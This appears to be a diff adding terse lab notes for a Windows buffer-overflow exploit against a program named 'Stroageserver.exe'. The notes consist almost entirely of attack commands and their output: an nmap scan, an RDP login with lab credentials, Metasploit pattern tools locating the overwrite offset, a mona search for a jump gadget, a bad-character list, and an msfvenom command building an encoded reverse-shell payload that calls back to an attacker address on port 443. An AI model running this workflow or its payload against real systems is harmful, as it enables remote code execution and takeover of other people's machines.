@@ -1,0 +1,31 @@
+nmap -sV -sC -Pn 192.168.23.110
+
+rdesktop -a 16 -z -u admin -p lab 192.168.23.111
+
+
+
+msf-pattern_create -l 3000
+
+38744237
+
+
+msf-pattern_offset -l 3000 -q 38744237
+
+
+1373
+
+
+
+!mona find -s "\xff\xe4" -m "Stroageserver.exe"
+
+
+Log data, item 3
+ Address=56526683
+\x56
+\x52
+\x66
+\x83
+
+##04##31##62##70
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.23 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x04\x31\x62\x70"
